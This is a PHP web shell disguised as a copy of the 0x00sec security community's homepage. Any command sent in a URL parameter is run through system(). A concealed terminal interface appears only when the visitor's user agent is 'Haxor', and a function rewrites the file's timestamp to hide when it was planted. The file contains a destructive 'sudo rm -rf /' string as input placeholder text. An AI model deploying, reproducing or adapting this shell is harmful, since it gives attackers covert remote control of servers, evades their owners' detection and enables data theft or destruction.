<?php
	error_reporting(E_ALL);
	
	$ip = $_SERVER['SERVER_ADDR'];
	$port = $_SERVER['SERVER_PORT'];
	$file = basename(__FILE__); 
	$connectstr = "http://".$ip.":".$port."/".$file;

	class UserInterface
	{
		public $pwd = "";
		private $currentUser = "";
		private $mode = "r";
		private $errorToo = '2>&1';
		private $command = "";

		public function doCommand($command)
		{
			return system($command." 2>&1");
		}
		
		public function getPwd()
		{
			$this->doCommand("/bin/pwd");
		}

		public function cd($path)
		{
			chdir($path);
		}

		public function timeStamp($stamp)
		{
			$nothing = popen("touch " . __FILE__ . " -t {$stamp}",$this->mode);
		}
	}

	$userInterface = new UserInterface();
?>


<?php if (isset($_GET['command']) || isset($_GET['shellCommand'])): ?>
<?php
	if(isset($_GET['command'])) {
		$command = $_GET['command'];
		switch($command) {
			case "pwd":
				$userInterface->getPwd();
				break;
			case "perm":
				$permissions = $userInterface.getPermissions();
				break;
			case "ps":
				$processes = $userInterface.getProcesses();
				break;
		}
	}
	
	if(isset($_GET['shellCommand'])) {
		$myCommand = $_GET['shellCommand'];
		$shellOut = $userInterface->doCommand($myCommand);
	}


?>
<?php else: ?>

<div id="luserContent">
<!DOCTYPE html>
<html>

    <head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>0x00sec</title>
<meta name="description" content="An awesome hacking community">

<link rel="profile" href="https://gmpg.org/xfn/11">
<link rel="stylesheet" href="http://netdna.bootstrapcdn.com/bootstrap/3.1.1/css/bootstrap.min.css">
<link rel="stylesheet" href="http://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css">
<link rel="stylesheet" type="text/css" media="all" href="http://blog.0x00sec.org/css/style.css">
<link rel="stylesheet" type="text/css" media="all" href="http://blog.0x00sec.org/css/jquery.mmenu.all.css">
<link rel="stylesheet" href="http://blog.0x00sec.org/css/highlightjs.piperita.css">

<!-- Favicons generated at http://realfavicongenerator.net/ -->
<link rel="apple-touch-icon" sizes="57x57" href="http://blog.0x00sec.org/favicons/apple-touch-icon-57x57.png">
<link rel="apple-touch-icon" sizes="60x60" href="http://blog.0x00sec.org/favicons/apple-touch-icon-60x60.png">
<link rel="apple-touch-icon" sizes="72x72" href="http://blog.0x00sec.org/favicons/apple-touch-icon-72x72.png">
<link rel="apple-touch-icon" sizes="76x76" href="http://blog.0x00sec.org/favicons/apple-touch-icon-76x76.png">
<link rel="apple-touch-icon" sizes="114x114" href="http://blog.0x00sec.org/favicons/apple-touch-icon-114x114.png">
<link rel="apple-touch-icon" sizes="120x120" href="http://blog.0x00sec.org/favicons/apple-touch-icon-120x120.png">
<link rel="apple-touch-icon" sizes="144x144" href="http://blog.0x00sec.org/favicons/apple-touch-icon-144x144.png">
<link rel="apple-touch-icon" sizes="152x152" href="http://blog.0x00sec.org/favicons/apple-touch-icon-152x152.png">
<link rel="apple-touch-icon" sizes="180x180" href="http://blog.0x00sec.org/favicons/apple-touch-icon-180x180.png">
<link rel="icon" type="image/png" href="http://blog.0x00sec.org/favicons/favicon-32x32.png" sizes="32x32">
<link rel="icon" type="image/png" href="http://blog.0x00sec.org/favicons/android-chrome-192x192.png" sizes="192x192">
<link rel="icon" type="image/png" href="http://blog.0x00sec.org/favicons/favicon-96x96.png" sizes="96x96">
<link rel="icon" type="image/png" href="http://blog.0x00sec.org/favicons/favicon-16x16.png" sizes="16x16">
<link rel="manifest" href="http://blog.0x00sec.org/favicons/manifest.json">
<link rel="shortcut icon" href="http://blog.0x00sec.org/favicons/favicon.ico">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-TileImage" content="/favicons/mstile-144x144.png">
<meta name="msapplication-config" content="/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">





</head>


    <body>

    <nav id="my-menu">
  <div>
    <p>0x00sec</p>

    <ul class="pages">
      <li><a href="http://blog.0x00sec.org/about/"><i class="fa fa-refresh"></i> About</a></li>
      <li><a href="http://blog.0x00sec.org/donations/"><i class="fa fa-shield"></i> Donations</a></li>
	  <li><a href="http://blog.0x00sec.org/irc"><i class="fa fa-group"></i> IRC</a></li>
	</ul>
  </div>
</nav>
<div class="menu-button" href="#menu"><i class="fa fa-bars"></i></div>


    <div class="page-content">
      <div class="wrap">
      <div class="container-fluid index">
    <div class="row">

        <div class="col-md-12 main content-panel">

            <div class="gravatar">
                <img src="https://0x00sec.s3.amazonaws.com/optimized/1X/321bb575613c9b7b0787e7e196d3fa7f0a42090e_1_500x500.png" class="img-circle about-image" height="150" width="150" alt="0x00sec">
            </div>

            <h1 class="header author-header" itemprop="headline">0x00sec</h1>

            <div class="author-text">
                An infosec/computer science community built by and for those with a fascination for computer science and/or security.
            </div>
          </div>
    </div>
</div>

      </div>
    </div>

    <div class="footer clearfix">
  <div class="col-md-6">
    0x00sec
  </div>
  <div class="col-md-6">
    &lt;/&gt; on <a href="https://github.com/0x00sec/">Github</a>  <i class="fa fa-github-alt"></i>
  </div>
</div>

<script src="http://code.jquery.com/jquery-1.11.0.min.js"></script>
<script src="http://netdna.bootstrapcdn.com/bootstrap/3.1.1/js/bootstrap.min.js"></script>
<script src="http://blog.0x00sec.org/js/jquery.mmenu.min.all.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/8.7/highlight.min.js"></script>
<script>hljs.initHighlightingOnLoad();</script>
<script type="text/javascript">
   $(document).ready(function() {
      $("#my-menu").mmenu().on( "closed.mm", function() {
            $(".menu-button").show();
         });
      $(".menu-button").click(function() {
        $(".menu-button").hide();
        $("#my-menu").trigger("open.mm");
      });
   });
</script>


<script type="text/javascript">

  function setFontSize() {

    var title, dateOfTitle, fontSizeOfTitle, listOfA, listOfSmall, listOfArticlesDiv, divWidth;

    listOfArticlesDiv = document.getElementsByClassName("articles");

    for (i = 0; i < listOfArticlesDiv.length; i++) {

      listOfA = document.getElementsByClassName("articles")[i].getElementsByTagName("a");
      listOfSmall = document.getElementsByClassName("articles")[i].getElementsByTagName("small");

      divWidth = document.getElementsByClassName("articles")[i].offsetWidth;

      for (k = 0; k < listOfSmall.length; k++) {

        title = $(listOfA[k]);
        dateOfTitle = $(listOfSmall[k]);

        fontSizeOfTitle = startingFontSize;
        title.css("font-size", fontSizeOfTitle);

        while (title.width() + dateOfTitle.width() >= divWidth)
          title.css("font-size", fontSizeOfTitle -= 0.5);

      }
    }
  }

  function getStartFontSize() {
    try {
      startingFontSize = parseInt($(document.getElementsByClassName("articles")[0].getElementsByTagName("a")[0]).css("font-size"));
      setFontSize();
      window.addEventListener('resize', setFontSize, true);
    } catch (e) {}
  }

  $(document).ready(getStartFontSize);

</script>



<script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-76839457-1']);
          _gaq.push(['_trackPageview']);
  (function () {
      var ga = document.createElement('script');
      ga.type = 'text/javascript';
      ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';

      var s = document.getElementsByTagName('script')[0];
      s.parentNode.insertBefore(ga, s);
  })();
</script>



    </body>
</html>

</div>


<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>

<div id="haxored" hidden="true">

<style rel="stylesheet" type="text/css">
#XmenuNav {
	background-color: #161616;
	float: center;
	width: 100%;
	height: 7%;
}

#menuNav ul {
	float: center;
}

#XmenuNav ul li {
	list-style-type: none;
	display: inline;
}

#XmenuNav #home {
	background-color: #2d2d2d;
	color: #fff;
	border: 0px;
}


#XmenuNav li button {
	height: 100%;
	border: 0px;
	padding: 0 10px;	
	float: left;
	color: #605e56;
	background-color: #161616;
}

#XmenuNav li button:hover {
	background-color: #2d2d2d;
	color: #fff;
	border: 0px;
}

#XmenuStats ul li {
	color: #cad0c4;
	float: right;
	padding: 12px 10px;
	margin-right: 30px;
}

#XmainShell {
	height: 90%;
	padding: 20px 0px;
	margin: 0px;
	background-color: #1f1f1f;
	color: #fff;
	width: 100%;
}

#XinputShell {
	margin-left: 3%;
	margin-right: 3%;
	padding-left: 2%;
	padding-right: 2%;
}


#XinputShell input {
	width: 100%;
	height: 50px;
	border: 0px;
	outline: none;
	padding-left: 10px;
	font-family: monospace;
	font-size: 15px;
	color: #cad0c4;
	background-color: #323232;
}

#XShellContainer {
	margin-top: 2%;
	margin-left: 5%;
	margin-right:5%;
	padding-left: 2%;
	padding-right: 0px;
	background-color: #2d2d2d;
	height: 80%;
}

#XShellOutput {
	height: 100%;
	width: 100%;
	overflow: auto;
	font-family: monospace;
	padding-top: 15px;
}


#XShellOutput pre {
	display: inline;
}

#XShellOutput .command {
	color: #1793d1;
}

#XShellOutput .output {
	color: #cad0c4;
	padding-bottom:40px;
}

</style>
<div id="Xcontainer">
	<div id="XmenuNav">
		<form action="" id="XmenuForm">
		<ul class="XmenuOptions">
			<li><button id="home"> Home </button></li>
			<li><button id="XbuttonPwd" name="command" value="pwd">PWD</button></li>
			<li><button id="XbuttonPerm" name="command" value="whoami">Permissions</button></li>
			<li><button id="XbuttonPs" name="command" value="ps">Processes</button></li>
			<li><button id="XbuttonIfconfig" name="command" value="ifconfig">Networking</button></li>
		</ul>
		<div id="XmenuStats">
			<ul>
				<li id="XPHPversion"> PHP </li>
			</ul>
		</div>
		</form>
	<br>
	</div>
	<div id="XmainContainer">
		<div id="XmainShell">
			<div id="XShellContainer">
				<div id="XShellOutput">
				</div>
			</div>
			<div id="XinputShell">
				<input type="text" placeholder="sudo rm -rf /" id="shellInput">
			</div>
		</div>
	
	<script type="text/javascript">	
		$(document).ready( function() {

			var history = [];
			var counter = 0;

			function submit(command) {
				history.push(command);
				$.ajax({
					url: "<?php echo $connectstr; ?>",
					type: "GET",
					data: {"shellCommand": command},
					success: function(data) {
					renderCmd(command, data)
				}
			});
		}

		var user = "badass";
		var hostname = "microserver";

		function renderCmd(command, output) {
			var time = new Date().toLocaleTimeString('en-GB', { hour: "numeric", minute: "numeric"});
			$("#XShellOutput").append("<pre class='command'>" + time + " "+ user + "@" + hostname + " $ " + command + "</pre>");
			$("#XShellOutput").append("<pre class='output'>" + output + "</pre>");
			$("#XShellOutput").scrollTop($("#XShellOutput")[0].scrollHeight);
		}
	
		var request = "";

	
		$("#XbuttonPwd").on('click', function(e) {
			e.preventDefault();
			request = "pwd";
			submit(request);
		});

		$("#XbuttonPerm").on('click', function(e) {
			e.preventDefault();
			request = "perm";
			submit(request);
		});

		$("#XbuttonPs").on('click', function(e) {
			e.preventDefault();
			request = "ps";
			submit(request);
		});


		$("#XbuttonIfconfig").on('click', function(e) {
			e.preventDefault();
			request = "ifconfig";
			submit(request);
		});

		var inputshell = document.getElementById("XinputShell");
		inputshell.addEventListener("keydown", function(e) {
			if (e.which == 13) {
				submit($("#shellInput").val());
				$("#shellInput").val("");
			}
		
			if (e.which == 38 && counter < history.length) {
				counter += 1;
			
				$("#shellInput").val(history[history.length - counter]);
			}

			if (e.which == 40 && counter > 0) {
				counter -= 1;
				$("#shellInput").val(history[history.length - counter]);
			}

			if (e.keyCode == 90 && e.ctrlKey) {
				$("#XShellOutput").empty();
			}
		});

		$("#XPHPversion").text("<?php echo 'Current PHP Version: ' . phpversion(); ?>");
	});

	$(document).ready(function() {
		if(navigator.userAgent == "Haxor") {
			console.log("Hello Master.")
			$("body").css({"margin":"0px"});
			$("#luserContent").remove();
			$("#haxored").prop("hidden", false);
		} else {
			console.log("#");	
			$("#haxored").remove();
		}
	});
</script>
</div>
<!-- Below here should be the closing </body> tag -->
<?php endif; ?>

